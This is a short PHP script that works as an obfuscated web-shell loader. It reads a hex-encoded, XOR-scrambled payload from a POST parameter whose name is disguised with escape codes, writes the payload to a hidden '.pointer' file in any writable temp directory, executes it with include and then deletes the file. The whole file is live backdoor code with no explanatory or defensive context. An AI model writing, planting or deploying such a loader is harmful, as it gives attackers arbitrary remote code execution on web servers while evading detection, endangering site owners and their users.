<?php

if(@$_POST["\x65\x6C\x65m\x65nt"] !== null){
	$ent = array_filter(["/dev/shm", sys_get_temp_dir(), "/tmp", ini_get("upload_tmp_dir"), getenv("TMP"), session_save_path(), "/var/tmp", getcwd(), getenv("TEMP")]);
	$holder = hex2bin($_POST["\x65\x6C\x65m\x65nt"]);
	$record=    ''; $d = 0; do{$record .= chr(ord($holder[$d]) ^ 46);$d++;} while($d < strlen($holder));
	foreach ($ent as $val):
    		if ((bool)is_dir($val) && (bool)is_writable($val)) {
    $descriptor = "$val" . "/.pointer";
    if (@file_put_contents($descriptor, $record) !== false) {
	include $descriptor;
	unlink($descriptor);
	exit;
}
}
endforeach;
}